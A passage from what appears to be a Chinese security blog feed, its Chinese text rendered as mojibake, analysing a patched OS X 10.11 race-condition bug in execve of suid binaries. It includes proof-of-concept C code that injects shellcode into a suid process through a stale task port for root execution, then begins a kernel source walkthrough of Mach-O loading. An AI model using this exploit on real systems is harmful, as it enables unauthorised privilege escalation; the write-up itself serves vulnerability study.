ç”³è¯·ä¸€é¡µå†…å­˜ï¼Œå¹¶ä¸”ä¼šå°†è¿™ä¸€é¡µå†…å­˜å†™å…¥å­è¿›ç¨‹</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> addr = <span class="number">0</span>;</span><br><span class="line">  err = mach_vm_allocate(mach_task_self(),</span><br><span class="line">                         &amp;addr,</span><br><span class="line">                         <span class="number">4096</span>,</span><br><span class="line">                         VM_FLAGS_ANYWHERE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"failed to mach_vm_allocate memory"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//å°†0x153cå¤„çš„å†™å…¥shellcode</span></span><br><span class="line">  FILE* f = fopen(suid_binary_path, <span class="string">"r"</span>);</span><br><span class="line">  fseek(f, <span class="number">0x1000</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  fread((<span class="keyword">char</span>*)addr, <span class="number">0x1000</span>, <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(((<span class="keyword">char</span>*)addr)+<span class="number">0x53c</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait to get the child's task port on the service port:</span></span><br><span class="line">  <span class="comment">// ç­‰å¾…å­è¿›ç¨‹å‘é€è¿‡æ¥çš„port</span></span><br><span class="line">  <span class="keyword">task_msg_recv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 service_port,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"error receiving service message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> target_task_port = msg.port.name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// before we ack the task port message to signal that the other process should execve the suid</span></span><br><span class="line">  <span class="comment">// binary get the lowest mapped address:</span></span><br><span class="line">  <span class="comment">// ç«‹åˆ»è·å–å†…å­˜çš„ä¿¡æ¯</span></span><br><span class="line">  <span class="keyword">struct</span> vm_region_basic_info_64 region;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">  <span class="keyword">memory_object_name_t</span> object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_size_t</span> target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> original_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  err = mach_vm_region(target_task_port,</span><br><span class="line">                       &amp;original_first_addr,</span><br><span class="line">                       &amp;target_first_size,</span><br><span class="line">                       VM_REGION_BASIC_INFO_64,</span><br><span class="line">                       (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                       &amp;region_count,</span><br><span class="line">                       &amp;object_name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"unable to get first mach_vm_region for target process\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] looks like the target processes lowest mapping is at %zx prior to execve\n"</span>, original_first_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send an ack message to the reply port indicating that we have the thread port</span></span><br><span class="line">  <span class="keyword">ack_msg_send_t</span> ack = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_msg_type_name_t</span> reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</span><br><span class="line"></span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>);</span><br><span class="line">  ack.header.msgh_size = <span class="keyword">sizeof</span>(ack);</span><br><span class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>); <span class="comment">// use the same rights we got</span></span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;ack.header);</span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"parent failed sending ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_first_addr = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait until we see that the map has been swapped and the binary is loaded into it:</span></span><br><span class="line">    <span class="comment">// ä¸æ–­çš„å¾ªç¯å»è·å–å†…å­˜çš„ä¿¡æ¯</span></span><br><span class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">    object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line">    target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">    target_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    err = mach_vm_region(target_task_port,</span><br><span class="line">                         &amp;target_first_addr,</span><br><span class="line">                         &amp;target_first_size,</span><br><span class="line">                         VM_REGION_BASIC_INFO_64,</span><br><span class="line">                         (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                         &amp;region_count,</span><br><span class="line">                         &amp;object_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; <span class="number">0x200000000</span>) &#123;</span><br><span class="line">      <span class="comment">// the first address has changed implying that the map was swapped</span></span><br><span class="line">      <span class="comment">// let's try to win the race</span></span><br><span class="line">      <span class="comment">// å½“å‘ç°è·å–åˆ°çš„å†…å­˜ä¿¡æ¯ä¸ä¹‹å‰çš„ä¸åŒ</span></span><br><span class="line">      <span class="comment">// è¯´æ˜ç«äº‰çš„çª—å£æ‰“å¼€äº†</span></span><br><span class="line">      <span class="comment">// å¯ä»¥å°è¯•å»å†™å…¥shellcodeäº†</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//å†™å…¥shellcode</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_addr = target_first_addr + <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> target_size = <span class="number">0x1000</span>;</span><br><span class="line">  mach_vm_protect(target_task_port, target_addr, target_size, <span class="number">0</span>, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</span><br><span class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hopefully overwrote some code in the target...\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the target first addr changed to %zx\n"</span>, target_first_addr);</span><br><span class="line">  <span class="comment">//å­è¿›ç¨‹çª—å£å…³é—­åå†…å­˜å·²ç»è¢«æ”¹å†™ï¼Œæ­£å¸¸æ‰§è¡Œåˆ°entryæ—¶ï¼Œå°†æ‰§è¡Œshellcodeã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çˆ¶è¿›ç¨‹çš„è¡Œä¸ºæ¯”è¾ƒå¤æ‚ï¼š</p>
<ul>
<li>æ„å»ºshellcode</li>
<li>è·å–å­è¿›ç¨‹port</li>
<li>æ ¹æ®å­è¿›ç¨‹çš„å†…å­˜ä¿¡æ¯å¾—åˆ°ç«äº‰çš„çª—å£æ‰“å¼€çš„æ—¶æœº</li>
<li>å†™å…¥shellcodeï¼Œç­‰å¾…shellcodeæ‰§è¡Œã€‚</li>
</ul>
<h1 id="0x04_å°ç»“">0x04 å°ç»“</h1><p>â€‹    é€šè¿‡æ¢³ç†pocä¸å†…æ ¸æºç åï¼Œåœ¨äº†è§£äº†<code>execv</code>å‡½æ•°ä¸€ç³»åˆ—çš„æ‰§è¡Œæµç¨‹ï¼Œå·²ç»å†…æ ¸çš„ä¸€ç³»åˆ—å†…å­˜æ“ä½œçš„å·¥å…·å‡½æ•°ä¹‹åï¼Œè¿™ä¸ªæ¼æ´å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„é€»è¾‘æ¼æ´ï¼Œé€šè¿‡ä¸€ä¸ªæ—§çš„portå¯ä»¥åœ¨portè¢«å…³é—­å‰ï¼Œä»»æ„æ”¹å†™è¿›ç¨‹çš„å†…å­˜åœ°å€ï¼Œå½“ç›®æ ‡è¿›ç¨‹ç¢°å·§æ˜¯setuidçš„è¿›ç¨‹æ—¶ï¼Œå°±å…·æœ‰äº†rootæƒé™æ‰§è¡Œä»»æ„ä»£ç çš„èƒ½åŠ›ã€‚</p>
<p>â€‹    é€šè¿‡pocçš„åˆ†æï¼Œåº”è¯¥å­¦ä¹ å·©å›ºçš„çŸ¥è¯†å¦‚ä¸‹ï¼š</p>
<ul>
<li>execvçš„æ‰§è¡Œæµç¨‹</li>
<li>portçš„ä½¿ç”¨</li>
<li>mach_vm_* API</li>
</ul>
<p>â€‹    å……åˆ†ç†è§£pocçš„åŸç†åï¼Œå¯ä»¥è¿›ä¸€æ­¥å¯¹è¿™ä¸ªæ¼æ´çš„Exploit to get kernel code executionåšå‡ºæ›´è¯¦ç»†çš„åˆ†æï¼Œä»è€Œåæ€ä¸æ€»ç»“ï¼Œå¦‚ä½•åœ¨å¼€å‘ä¸­é¢„é˜²è¿™ç§æ¼æ´çš„äº§ç”Ÿä»¥åŠå¦‚ä½•é€šè¿‡æµ‹è¯•æˆ–è€…ä»£ç å®¡è®¡çš„æ‰‹æ®µå‘ç°ç±»ä¼¼çš„æ¼æ´ã€‚</p>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1><ol>
<li>[<a href="https://www.freebsd.org/cgi/man.cgi?query=vnode" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=vnode</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html</a></li>
<li><a href="http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html" target="_blank" rel="external">http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></li>
<li><a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></li>
</ol>
<h1 id="ps">ps</h1><p>è¿™æ˜¯æˆ‘çš„å­¦ä¹ åˆ†äº«åšå®¢<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>æ¬¢è¿å¤§å®¶æ¥æ¢è®¨ï¼Œä¸è¶³ä¹‹å¤„è¿˜è¯·æŒ‡æ­£ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><blockquote>
<p>çµçŠ€ä¸€æŒ‡å¯æ”»å¯å®ˆï¼Œè¿›æ”»æ—¶ä¹Ÿæ˜¯ä¸€æŒ‡ï¼Œæ˜¯å¤©ä¸‹ç¬¬ä¸€æŒ‡æ³•ï¼Œä¸ç§»èŠ±æ¥ç‰è¿™ä¸ªå¤©ä¸‹ç¬¬ä¸€æŒæ³•åŒæ ·éƒ½æ˜¯éå…µåˆƒçš„ç¬¬ä¸€ç»æŠ€</p>
<p>â€”é™†å°å‡¤ä¼ å¥‡</p>
</blockquote>
<p>æœ€è¿‘çš„10.11.4è¡¥ä¸ä¿®å¤äº†ä¸€ä¸ªåˆ©ç”¨æ¡ä»¶ç«äº‰è·å¾—ä»£ç æ‰§è¡Œæƒé™çš„æ¼æ´ï¼Œç»è¿‡å¯¹å†…æ ¸æºç ä»¥åŠpocçš„ç†è§£ä¹‹åï¼Œå…ˆå¯¹é—®é¢˜ä½œå‡ºä¸€ä¸ªç®€å•çš„åˆ†æã€‚</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/30/OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ/</id>
    <published>2016-03-30T23:58:05.000Z</published>
    <updated>2016-03-31T15:39:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    ç ”ç©¶<code>OS X</code>å®‰å…¨æ–¹é¢çš„çŸ¥è¯†éœ€è¦å¯¹<code>mach-o</code>åŠ è½½çš„æµç¨‹éœ€è¦æœ‰ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„ç†è§£ï¼Œæ–­æ–­ç»­ç»­ä¸€ä¸ªæœˆçš„æ—¶é—´é‡Œé¢ï¼Œé€šè¿‡å¯¹æºç çš„é˜…è¯»å¯¹<code>mach-o</code>çš„åŠ è½½æœ‰ä¸€ä¸ªæ¯”è¾ƒåŸºæœ¬çš„è®¤è¯†ï¼Œåœ¨é‡åˆ°å„ä¸ªå…·ä½“çš„é—®é¢˜æ˜¯æ‰èƒ½æ›´å¥½çš„ç†è§£å’Œæ“ä½œã€‚</p>
<p>â€‹    å…¶ä»–ç›¸å…³æ–‡ç« å¯ä»¥çœ‹è¿™é‡Œï¼ŒåŸºæœ¬æ¶µç›–äº†ä»å†…æ ¸æ€åˆ°åº”ç”¨å±‚çš„ç›¸å…³æºç çš„ç®€å•åˆ†æã€‚è¿˜æœ‰ä¸è¶³ä¹‹å¤„åœ¨é‡åˆ°ç›¸å…³çš„é—®é¢˜æ—¶ä¹Ÿä¼šåŠ åˆ°è¿™ä¸€ç³»åˆ—æ–‡ç« ä¸­ã€‚</p>
<p>â€‹    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-oåŠ è½½æµç¨‹å­¦ä¹ -dyldå¯¹ä¸»imageçš„å¤„ç†æµç¨‹</a></p>
<p>â€‹    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-oåŠ è½½æµç¨‹å­¦ä¹ -dyldå¯¹ä¾èµ–åº“çš„åŠ è½½æµç¨‹</a></p>
<p>â€‹    3.mach-oåŠ è½½æµç¨‹å­¦ä¹ -å†…æ ¸å¯¹mach-oæ–‡ä»¶çš„åŠ è½½æµç¨‹(æœ¬æ–‡)</p>
<p>â€‹    </p>
<p>â€‹    é€šè¿‡ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥æ¯”è¾ƒæ¸…æ¥šçš„ç†è§£æ•´ä¸ªæµç¨‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="æ•´ä½“æµç¨‹"></p>
<a id="more"></a>
<h1 id="0x01_æºç åˆ†æ">0x01 æºç åˆ†æ</h1><h2 id="1-1___mac_execve">1.1 __mac_execve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__mac_execve(<span class="keyword">proc_t</span> p, <span class="keyword">struct</span> __mac_execve_args *uap, <span class="keyword">int32_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *bufp = <span class="literal">NULL</span>; </span><br><span class="line">	<span class="keyword">struct</span> image_params *imgp;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *vap;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *origvap;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> is_64 = IS_64BIT_PROCESS(p);</span><br><span class="line">	<span class="keyword">struct</span> vfs_context context;</span><br><span class="line">	<span class="keyword">struct</span> uthread	*uthread;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//åˆå§‹åŒ–context</span></span><br><span class="line">	context.vc_thread = current_thread();</span><br><span class="line">	context.vc_ucred = kauth_cred_proc_ref(p);	<span class="comment">/* <span class="label">XXX must NOT be kauth_cred_get() */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate a big chunk for locals instead of using stack since these  </span><br><span class="line">	 * structures a pretty big.</span><br><span class="line">	 */</span></span><br><span class="line">  	//ç”³è¯·ä¸€å—è¿ç»­çš„å¤§å†…å­˜ï¼Œç”¨æ¥å­˜æ”¾imgpï¼Œvapï¼Œorigvapçš„æ•°æ®ç»“æ„</span><br><span class="line">	MALLOC(bufp, char *, (sizeof(*imgp) + sizeof(*vap) + sizeof(*origvap)), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	imgp = (struct image_params *) bufp;</span><br><span class="line">	if (bufp == NULL) &#123;</span><br><span class="line">		error = ENOMEM</span><br><span class="line">		goto exit_with_error;</span><br><span class="line">	&#125;</span><br><span class="line">  	//é€šè¿‡æ•°æ®ç»“æ„sizeçš„åç§»ï¼ŒæŒ‡å‘å¯¹åº”çš„å†…å­˜ç©ºé—´</span><br><span class="line">  	//imgp,vap,origvapå®é™…æ˜¯è¿ç»­çš„ä¸€å—å†…å­˜</span><br><span class="line">	vap = (struct vnode_attr *) (bufp + sizeof(*imgp));</span><br><span class="line">	origvap = (struct vnode_attr *) (bufp + sizeof(*imgp) + sizeof(*vap));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize the common data in the image_params structure */</span></span><br><span class="line">	//åˆå§‹åŒ–æ•°æ®</span><br><span class="line">  	imgp-&gt;ip_user_fname = uap-&gt;fname;</span><br><span class="line">	imgp-&gt;ip_user_argv = uap-&gt;argp;</span><br><span class="line">	imgp-&gt;ip_user_envv = uap-&gt;envp;</span><br><span class="line">	imgp-&gt;ip_vattr = vap;</span><br><span class="line">	imgp-&gt;ip_origvattr = origvap;</span><br><span class="line">	imgp-&gt;ip_vfs_context = &amp;context;</span><br><span class="line">	imgp-&gt;ip_flags = (is_64 ? IMGPF_WAS_64BIT : IMGPF_NONE) | ((p-&gt;p_flag &amp; P_DISABLE_ASLR) ? IMGPF_DISABLE_ASLR : IMGPF_NONE);</span><br><span class="line">	imgp-&gt;ip_seg = (is_64 ? UIO_USERSPACE64 : UIO_USERSPACE32);</span><br><span class="line">	imgp-&gt;ip_mac_return = 0;</span><br><span class="line"></span><br><span class="line">  	//è®¾ç½®çº¿ç¨‹ä¿¡æ¯</span><br><span class="line">	uthread = get_bsdthread_info(current_thread());</span><br><span class="line">	if (uthread-&gt;uu_flag &amp; UT_VFORK) &#123;</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_VFORK_EXEC;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	//MACæ¨¡å—ç›¸åº”çš„å¤„ç†ï¼Œä¸è¿›ç¨‹çš„æƒé™ç›¸å…³</span><br><span class="line">  	//MAC:https://www.freebsd.org/doc/handbook/mac.html</span><br><span class="line">#if CONFIG_MACF</span><br><span class="line">	if (uap-&gt;mac_p != USER_ADDR_NULL) &#123;</span><br><span class="line">		error = mac_execve_enter(uap-&gt;mac_p, imgp);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">			goto exit_with_error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line">	</span><br><span class="line">  	//æ‰§è¡Œimage</span><br><span class="line">	error = exec_activate_image(imgp);</span><br><span class="line"></span><br><span class="line">  	//é‡Šæ”¾èµ„æºä¸å‡ºé”™å¤„ç†</span><br><span class="line">	kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Image not claimed by any activator? */</span></span><br><span class="line">	if (error == -1)</span><br><span class="line">		error = ENOEXEC;</span><br><span class="line">	<span class="comment">/*...*/</span>	</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯è¿›è¡Œäº†ä¸€äº›æ•°æ®ç»“æ„çš„åˆå§‹åŒ–å·²ç»æƒé™çš„åˆ¤æ–­ï¼Œèµ„æºçš„è·å–ä¸é‡Šæ”¾ï¼Œä¸»è¦é€»è¾‘åœ¨<code>exec_activate_image</code>ä¸­ã€‚</p>
<h2 id="1-2_exec_activate_image">1.2 exec_activate_image</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * exec_activate_image</span><br><span class="line"> *</span><br><span class="line"> * Description:	Iterate through the available image activators, and activate</span><br><span class="line"> *		the image associated with the imgp structure.  We start with</span><br><span class="line"> *		the</span><br><span class="line"> *</span><br><span class="line"> * Parameters:	struct image_params *	Image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	0			Success</span><br><span class="line"> *		EBADEXEC		The executable is corrupt/unknown</span><br><span class="line"> *	execargs_alloc:EINVAL		Invalid argument</span><br><span class="line"> *	execargs_alloc:EACCES		Permission denied</span><br><span class="line"> *	execargs_alloc:EINTR		Interrupted function</span><br><span class="line"> *	execargs_alloc:ENOMEM		Not enough space</span><br><span class="line"> *	exec_save_path:EFAULT		Bad address</span><br><span class="line"> *	exec_save_path:ENAMETOOLONG	Filename too long</span><br><span class="line"> *	exec_check_permissions:EACCES	Permission denied</span><br><span class="line"> *	exec_check_permissions:ENOEXEC	Executable file format error</span><br><span class="line"> *	exec_check_permissions:ETXTBSY	Text file busy [misuse of error code]</span><br><span class="line"> *	exec_check_permissions:???</span><br><span class="line"> *	namei:???</span><br><span class="line"> *	vn_rdwr:???			[anything vn_rdwr can return]</span><br><span class="line"> *	&lt;ex_imgact&gt;:???			[anything an imgact can return]</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">exec_activate_image</span><span class="params">(<span class="keyword">struct</span> image_params *imgp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> nameidata *ndp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> resid;</span><br><span class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></span><br><span 